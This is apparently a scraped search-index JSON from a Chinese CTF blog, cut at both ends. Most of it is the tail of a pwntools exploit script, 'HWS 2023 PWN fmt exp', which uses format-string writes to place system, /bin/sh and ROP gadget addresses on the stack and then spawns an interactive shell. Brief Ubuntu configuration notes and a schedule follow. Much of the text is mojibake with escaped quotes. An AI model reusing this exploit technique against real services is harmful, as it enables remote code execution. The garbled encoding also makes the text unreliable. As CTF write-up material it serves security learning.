b\u0026#39;%\u0026#39; + str(c).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; payload11 += b\u0026#39;%11$hhn\u0026#39; n4 = len(payload11) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 payload11 += b\u0026#39;a\u0026#39; * n5 payload11 += p64(stack_2) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) \u0026#34;\u0026#34;\u0026#34; 3.åˆ©ç”¨å­—ç¬¦ä¸²æ¼æ´å‘æ ˆä¸Šå¡«å†™systemå‡½æ•°çš„åœ°å€ çš„å‰å››ä½ï¼ï¼ï¼ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;system_____å‰å››ä½_______addr!!!!!!!\u0026#34;) one_gadget = sys_addr sys_addr_min = hex(one_gadget) pop_rdi_ret = 0x01453 payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) if is_ret == 1: shift = 24 else: shift = 16 brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + shift brr[1] = 4 + shift brr[2] = 3 + shift brr[3] = 2 + shift brr[4] = 1 + shift brr[5] = 0 + shift log.success(\u0026#34;sys_addr\u0026#34; + hex(sys_addr)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 # æ£€éªŒæ’åºåçš„ç»“æœ log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;system_____å®Œæˆå‰å››ä½_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è·³è½¬ä¸€æ¬¡mainå‡½æ•° \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; åœ¨æ ˆä¸Šå¡«å†™systemååŠéƒ¨åˆ†ï¼š \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;system_______å®Œæˆåå››ä½_______addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è½¬ä¸€æ¬¡mainå‡½æ•° \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 3.å¡«å†™binshçš„åœ°å€ çš„å‰å››ä½ï¼ï¼ï¼ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;binsh_____å‰å››ä½_________addr!!!!!!!\u0026#34;) # binsh = _binsh + libc_base binsh = libc_base + libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__() one_gadget = binsh sys_addr_min = hex(one_gadget) pop_rdi_ret = 0x01453 payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + 8 brr[1] = 4 + 8 brr[2] = 3 + 8 brr[3] = 2 + 8 brr[4] = 1 + 8 brr[5] = 0 + 8 log.success(\u0026#34;sys_addr\u0026#34; + hex(one_gadget)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;binsh_____å®Œæˆå‰å››ä½_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è·³è½¬ä¸€æ¬¡mainå‡½æ•° \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; binshååŠéƒ¨åˆ†ï¼š \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;binsh_______å®Œæˆåå››ä½_______addr!!!!!!!\u0026#34;) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 4.å¡«å†™ret çš„åœ°å€ çš„å‰å››ä½ï¼ï¼ï¼ï¼ˆä¿è¯64ä½æ ˆå¹³è¡¡ï¼‰ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;ret_____å‰å››ä½_________addr!!!!!!!\u0026#34;) if is_remote == 1 or is_remote == 2: pop__ret = 0x22679 + libc_base else: pop__ret = 0x29cd6 + libc_base one_gadget = pop__ret sys_addr_min = hex(one_gadget) payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + 16 brr[1] = 4 + 16 brr[2] = 3 + 16 brr[3] = 2 + 16 brr[4] = 1 + 16 brr[5] = 0 + 16 log.success(\u0026#34;sys_addr\u0026#34; + hex(one_gadget)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) if is_ret == 1: taolve.recvuntil(b\u0026#34;str: \u0026#34;) # _gdb(2) # pause() if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;ret_____å®Œæˆå‰å››ä½_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è·³è½¬ä¸€æ¬¡mainå‡½æ•° \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; retååŠéƒ¨åˆ†ï¼š \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) if is_ret == 1: taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload1) log.success(\u0026#34;ret_______å®Œæˆåå››ä½_______addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è·³è½¬ä¸€æ¬¡mainå‡½æ•°ï¼š \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) log.success(\u0026#34;retretttt______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 5.å¡«å†™pop_rdi_ret çš„åœ°å€ çš„å‰å››ä½ï¼ï¼ï¼ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;pop_rdi_ret______________addr!!!!!!!\u0026#34;) ret_rdi = 0x01453 + run_base1 one_gadget = ret_rdi sys_addr_min = hex(one_gadget) payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:6], 16) crr[1] = int(sys_addr_min[6:10], 16) crr[2] = int(sys_addr_min[10:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 4 brr[1] = 2 brr[2] = 0 log.success(\u0026#34;sys_addr\u0026#34; + hex(sys_addr)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2])) text = 0 for i in range(3): for j in range(0, 3 - i - 1): if crr[j] \u0026lt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 # if text == 0: # exec(open(\u0026#39;45.py\u0026#39;).read()) # quit() log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2])) payload1 += b\u0026#39;%\u0026#39; + str(crr[2]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; payload1 += b\u0026#39;%\u0026#39; + str(crr[1]-crr[2]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(12).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; payload1 += b\u0026#39;%\u0026#39; + str(crr[0]-crr[1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(13).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 payload1 += p64(stack_2 + brr[2]) + p64(stack_2 + brr[1]) + p64(stack_2 + brr[0]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;pop_rdi_ret______å®Œæˆåå››ä½_______addr!!!!!!!\u0026#34;) ret_rdi = 0x01453 + run_base cc = int(hex(ret_rdi)[10:12], 16) dd = int(hex(ret_rdi)[12:14], 16) log.success(\u0026#34;ret_rdi == \u0026#34; + hex(ret_rdi)) log.success(\u0026#34;ccccc == \u0026#34; + hex(cc) + hex(dd)) frr = [1, 2] frr[0] = 1 frr[1] = 0 if cc \u0026lt; dd: cc, dd = dd, cc frr[0], frr[1] = frr[1], frr[0] payload4 = b\u0026#39;%\u0026#39; + str(dd).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; payload4 += b\u0026#39;%11$hhn\u0026#39; payload4 += b\u0026#39;%\u0026#39; + str(cc - dd).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; payload4 += b\u0026#39;%12$hhn\u0026#39; n4 = len(payload4) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 payload4 += b\u0026#39;a\u0026#39; * n5 payload4 += p64(stack_2 + frr[1]) + p64(stack_2 + frr[0]) # + p64(stack_2+2) taolve.recvuntil(b\u0026#34;str: \u0026#34;) if is_sleep == 1: sleep(1) pad = b\u0026#34;-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p-%23$p-%24$p-\u0026#34; taolve.sendline(pad) log.success(\u0026#34;retretttt_____________addr!!!!!!!\u0026#34;) # taolve.recvuntil(b\u0026#34;str: \u0026#34;) # taolve.sendline(b\u0026#34;ls\u0026#34;) # taolve.recv() # if is_sleep == 0: # sleep(1) # taolve.sendline(b\u0026#34;cat /flag\u0026#34;) taolve.recv() taolve.interactive() æ¯”èµ›æˆªå›¾ï¼š\n","date":"July 18, 2023","permalink":"/posts/wp/2023_07_hws/fmt2/","section":"Posts","summary":"æ¯”èµ›æ—¶çš„è„šæœ¬ï¼šï¼ˆæœ‰ç‚¹ä¹±ï¼‰ # encoding: utf-8 from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 1 is_gdb","title":"HWS 2023 PWN fmt exp"},{"content":"","date":"July 18, 2023","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"July 18, 2023","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"PWN"},{"content":"","date":"July 18, 2023","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"July 18, 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"July 18, 2023","permalink":"/categories/wp/","section":"Categories","summary":"","title":"WP"},{"content":"","date":"July 18, 2023","permalink":"/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","section":"Tags","summary":"","title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"},{"content":"æ­¤æ–‡ç« è¿˜åœ¨æ–½å·¥ä¸­ï¼Œ\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„å­¦ä¹ è®°å½•å§ï¼š\nNew article!\r2023 ciscn åˆèµ› June 30, 2023\u0026middot;1691 å­—\u0026middot;4 åˆ†é’Ÿ WP CTF PWN reverse Crypto æ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\r# å³é”®èœå•æ·»åŠ è‡ªå®šä¹‰å‘½ä»¤ # æœ¬æ–‡ä»¥æ·»åŠ å³é”®ä½¿ç”¨vscodeæ‰“å¼€ä¸ºä¾‹ # 1.è¿›å…¥~/.local/share/nautilus/scriptsæ–‡ä»¶å¤¹ cd ~/.local/share/nautilus/scripts # 2.åˆ›å»ºæ–‡ä»¶ vim \u0026#34;Open in vscode\u0026#34; #æ–‡ä»¶å\u0026#34;Open in vscode\u0026#34;ä½œä¸ºå³é”®èœå•Scriptsçš„äºŒçº§èœå•å # 3.æ·»åŠ ç›¸åº”è„šæœ¬ #!/bin/bash code ./ # 4.ä¿å­˜é€€å‡º :wq # 5.èµ‹äºˆæƒé™ sudo chmod u+x Vscode_it å‚è€ƒé“¾æ¥ï¼š (5æ¡æ¶ˆæ¯) Ubuntu18.04æ·»åŠ å³é”®èœå•_ubuntu nautilusä¿®æ”¹å³é”®_CHAOS_ORDERçš„åšå®¢-CSDNåšå®¢\nubuntuç³»ç»Ÿï¼ˆ22.04ï¼‰ä¸‹å³é”®é»˜è®¤æ˜¯æ²¡æœ‰æ–°å»ºæ–‡æ¡£ï¼ˆæ–‡æœ¬æ–‡æ¡£ã€officeç­‰ï¼‰åŠŸèƒ½çš„ã€‚\nä½†å¯ä»¥æ‰‹åŠ¨æ·»åŠ ã€‚\n1ã€ åœ¨ä¸»ç›®å½•ä¸‹æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶å¤¹ï¼Œè¿™æ—¶å€™æ–‡ä»¶å¤¹é‡Œé¢æ˜¯ç©ºçš„ã€‚\n2ã€ æ‰“å¼€æ–‡æœ¬æ–‡æ¡£ï¼Œä¿å­˜ä¸ºä¸€ä¸ªæ–°çš„ç©ºç™½æ–‡æ¡£ï¼ˆå‘½åä¸ºTxt Document.txtï¼‰ï¼Œå°†è¿™ä¸ªç©ºç™½æ–‡æ¡£ä¿å­˜åˆ°è¿™ä¸ªæ¨¡æ¿æ–‡ä»¶å¤¹ä¸‹ã€‚\nè¿™æ—¶å€™å†å³é”®ç©ºç™½å¤„å°±ä¼šå‘ç°å¤šäº†ä¸€ä¸ªæ–°å»ºæ–‡æ¡£é€‰é¡¹ï¼Œä¸‹é¢å¯é€‰é¡¹æœ‰Txt Documentã€‚\n3ã€åŒç†å¯ä»¥æ–°å»ºç©ºç™½çš„LibreOffice Writer/Calc/Impressç­‰æ–‡æ¡£ï¼Œä¿å­˜è‡³æ¨¡æ¿æ–‡ä»¶å¤¹ä¸‹ã€‚\nå¦å¤–ï¼ŒLibreOffice Writer/Calc/Impressç­‰ä¹Ÿå¯ä»¥å¦å­˜ä¸ºOffice Word/Excel/PPTæ ¼å¼çš„æ¨¡æ¿\næŠŠéœ€è¦çš„ç©ºç™½æ¨¡æ¿æ”¾å…¥æ¨¡æ¿æ–‡ä»¶å¤¹åï¼Œå³é”®ç©ºç™½å°±å¯ä»¥æ–°å»ºç›¸åº”çš„æ–‡ä»¶äº†ã€‚\nå‚è€ƒé“¾æ¥ï¼š ubuntu 22.04ç³»ç»Ÿæ·»åŠ å³é”®æ–°å»ºæ–‡æœ¬æ–‡æ¡£åŠOfficeçš„åŠŸèƒ½ - çŸ¥ä¹ (zhihu.com)\n# å³é”®å•å‡»æ–‡ä»¶å¹¶é€‰æ‹©â€œä»¥ç®¡ç†å‘˜èº«ä»½ç¼–è¾‘â€ sudo apt install nautilus-admin # å®‰è£…æ‰©å±•åï¼Œæ‚¨éœ€è¦é‡æ–°å¯åŠ¨æ–‡ä»¶ç®¡ç†å™¨ä»¥åº”ç”¨æ›´æ”¹ã€‚ # ä¸ä»…å…³é—­å¹¶é‡æ–°æ‰“å¼€æ–‡ä»¶ç®¡ç†å™¨çª—å£ï¼Œ # è¿˜éœ€è¦è¿è¡Œå‘½ä»¤é€€å‡ºåå°æœåŠ¡å¹¶è®©å®ƒè‡ªåŠ¨é‡æ–°å¯åŠ¨ï¼š nautilus -q ","date":"July 14, 2023","permalink":"/posts/pwn/basic/linux_/","section":"Posts","summary":"æ­¤æ–‡ç« è¿˜åœ¨æ–½å·¥ä¸­ï¼Œ è·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„å­¦ä¹ è®°å½•å§ï¼š New article! 2023 ciscn","title":"Linux é…ç½®è¡¥å……"},{"content":"","date":"July 14, 2023","permalink":"/series/pwn%E5%85%A5%E9%97%A8/","section":"Series","summary":"","title":"PWNå…¥é—¨"},{"content":"","date":"July 14, 2023","permalink":"/tags/ubuntu/","section":"Tags","summary":"","title":"Ubuntu"},{"content":"","date":"July 14, 2023","permalink":"/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"Categories","summary":"","title":"åŸºç¡€çŸ¥è¯†"},{"content":"","date":"July 12, 2023","permalink":"/categories/life/","section":"Categories","summary":"","title":"Life"},{"content":"æ­¤æ–‡ç« è¿˜åœ¨æ–½å·¥ä¸­ï¼Œ\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„å­¦ä¹ è®°å½•å§ï¼š\nNew article!\r2023 ciscn åˆèµ› June 30, 2023\u0026middot;1691 å­—\u0026middot;4 åˆ†é’Ÿ WP CTF PWN reverse Crypto æ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\rå…³äº DDL # 7æœˆ12æ—¥â€”â€”å¤§åˆ›ç”³è¯·ä¹¦ 1 ç¨¿ 7æœˆ12æ—¥â€”â€”å­—èŠ‚è·³åŠ¨è®­ç»ƒè¥ç¬”è¯•åå•å…¬å¸ƒ 7æœˆ14æ—¥â€”â€”å¤§åˆ›ç”³è¯·ä¹¦ 2 ç¨¿ 7æœˆ14æ—¥â€”â€”åä¸ºhwsç¬”è¯•åå•å…¬å¸ƒ 7æœˆ15ã€16æ—¥â€”â€”å­—èŠ‚è·³åŠ¨ç¬”è¯• 7æœˆ15ã€16ã€17æ—¥â€”â€”åä¸º hws ç¬”è¯• 7æœˆ20æ—¥â€”â€”å¤§åˆ›ç”³è¯·ç­”è¾©PPT 7æœˆ25æ—¥â€”â€”å¤§åˆ›ç”³è¯·ç­”è¾© 7æœˆ28æ—¥â€”â€”å †å­¦ä¹  7æœˆ29æ—¥â€”â€”Android kernel pwnå­¦ä¹  8æœˆ05æ—¥â€”â€”è“å¸½æ¯ï¼ˆå–è¯é¢˜å¤ä¹ ï¼‰ å…³äºé‡è¦äº‹é¡¹ # PWN # å †å…¥é—¨ unsort bin attack unlink uaf house of use ç¬¬ä¸€æ¬¡ ç¬¬äºŒæ¬¡ ç¬¬ä¸‰æ¬¡ æ´»åŠ¨ # è“å¸½æ¯ 7æœˆ31æ—¥ å–è¯é¢˜å­¦ä¹  8æœˆ05æ—¥ 09:00-18:00 å­—èŠ‚è·³åŠ¨ 7æœˆ15ã€16æ—¥ ç¬”è¯• åä¸ºhwsç¡¬ä»¶å®‰å…¨ 7æœˆ15ã€16ã€17æ—¥ ç¬”è¯• geekcon Android kernel pwn ç¬¬ä¸€æ¬¡å­¦ä¹ è®°å½• ç¬¬äºŒæ¬¡å­¦ä¹ è®°å½• ç¬¬ä¸‰æ¬¡å­¦ä¹ è®°å½• å¤§åˆ› # ç”³è¯·ä¹¦ 1ç¨¿ 2ç¨¿ 3ç¨¿ ç»ˆç¨¿ ç­”è¾© PPTä¸€ç¨¿ PPTäºŒç¨¿ ç­”è¾©ç¨¿å­ æ¨¡æ‹Ÿç­”è¾© ","date":"July 12, 2023","permalink":"/pointer/schedole/2023_07_12/","section":"Pointers","summary":"æ­¤æ–‡ç« è¿˜åœ¨æ–½å·¥ä¸­ï¼Œ è·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„å­¦ä¹ è®°å½•å§ï¼š New article! 2023 ciscn","title":"my schedole"},{"content":"","date":"July 12, 2023","permalink":"/pointer/","section":"Pointers","summary":"","title":"Pointers"},{"content":"","date":"July 12, 